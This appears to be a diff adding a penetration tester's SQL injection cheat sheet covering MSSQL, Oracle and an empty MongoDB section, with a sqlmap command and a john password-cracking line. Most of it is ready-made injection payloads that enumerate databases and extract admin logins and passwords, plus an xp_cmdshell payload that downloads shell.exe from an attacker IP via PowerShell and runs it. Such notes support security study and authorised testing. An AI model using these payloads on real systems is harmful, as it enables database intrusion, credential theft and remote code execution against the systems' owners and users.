@@ -1,0 +1,101 @@
+SQL Cheat sheet - MSSQL
++++++++++++++++++++++++++++++
+
+https://guif.re/sqli#MsSql%20error-based%20Exploitation
+
+SQLMAP
+sqlmap -r Req.txt -p "song" --dbms=MSSQL --tables --proxy http://127.0.0.1:8181
+
+Manual
+
+Alice' order by 2; --
+Alice' UNION ALL SELECT NULL,NULL-- 
+Alice' UNION ALL SELECT CHAR(1),NULL-- 
+Alice' UNION ALL SELECT user_name(),NULL-- 
+Alice' UNION ALL SELECT system_user,NULL-- 
+Alice' UNION ALL SELECT user,NULL-- 
+Alice' UNION ALL SELECT system_user,NULL-- 
+Alice' UNION ALL SELECT DB_NAME(),NULL-- 
+Alice';exec master..xp_cmdshell "powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.244/shell.exe', 'shell.exe')"; --  
+Alice';exec master..xp_cmdshell 'shell.exe' ; -- 
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+SQL Cheat sheet - MSSQL - INSERT STATEMENT (Error Based)
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+http://securityidiots.com/Web-Pentest/SQL-Injection/mssql-insert-query-injection.html
+https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
+https://www.youtube.com/watch?v=C6lC3zTDvzc&feature=emb_logo
+hints-
+1. test');create table test(info varchar (25) )-- --> to check the persmission, if yes try xp cmdshell
+2. To find the any valid table name apart for dual
+3. insert into tablename (column1,column2,column3,column4)values(1,'value2',''*(select 1 from dual where @@version=1)*'','value4');
+
+'*(select 1 from dbo.users where CONVERT(INT,CHAR(58))=1)*'
+
+'*(select 1 from dbo.users where @@servername=1)*'
+
+'*(select 1 from dbo.users where @@servername=1)*'
+
+'*(select 1 from dbo.users where CONVERT(INT,db_name(2))=1)*'
+
+'*(select 1 from dbo.users where CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 5 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))=1)*'
+
+
+'*(select 1 from dbo.users where CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 5 column_name FROM (SELECT DISTINCT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='users' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58)))=1)*'
+
+'*(select 1 from dbo.users where CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM users)+CHAR(58)+CHAR(58)))=1)*'
+
+'*(select 1 from dbo.users where CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 6 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))=1)*'
+
+'*(select 1 from dbo.users where CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 100 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58)))=1)*'
+
+'*(select 1 from dbo.users where CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM [archive]..[pmanager] )+CHAR(58)+CHAR(58)))=1)*'
+
+'*(select 1 from dbo.users where CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 alogin FROM (SELECT top 2 alogin FROM archive..pmanager ORDER BY alogin ASC) sq ORDER BY alogin DESC)+CHAR(58)+CHAR(58)))=1)*'
+
+'*(select 1 from dbo.users where CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 id FROM (SELECT top 4 id FROM archive..pmanager ORDER BY id ASC) sq ORDER BY id DESC)+CHAR(58)+CHAR(58)))=1)*'
+
+'*(select 1 from dbo.users where CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 5 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58)))=1)*'
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+SQL Cheat sheet - ORACLE
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+https://www.youtube.com/watch?v=r8qiw1J64wY
+http://securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
+Alice'
+Alice' UNION ALL SELECT NULL,CHR(113),NULL FROM DUAL -- (DUal is temp table)
+Alice' UNION ALL SELECT NULL,CHR(113),NULL FROM DUAL
+Alice' UNION ALL SELECT NULL,sys.database_name,NULL FROM DUAL --
+Alice' UNION ALL SELECT NULL,user,NULL FROM DUAL --
+Alice' UNION ALL SELECT NULL,(select banner from v$version where rownum=1),NULL FROM DUAL --
+Alice' UNION ALL SELECT NULL,table_name,NULL FROM  all_tables-- (search for paticular table since it dumbs all tables)
+Alice' UNION ALL SELECT NULL,column_name,NULL FROM all_tab_columns where table_name='WEB_ADMINS'--
+Alice' UNION ALL SELECT NULL,ADMIN_ID||ADMIN_NAME||PASSWORD,NULL FROM WEB_ADMINS--
+
+
+
+Mango DB 
++++++++++++++++++++++++++++++++++++++
+https://www.youtube.com/watch?v=qamUR5sn0Bo
+
+
+Password cracker
+++++++++++++++++
+john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt passwod 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
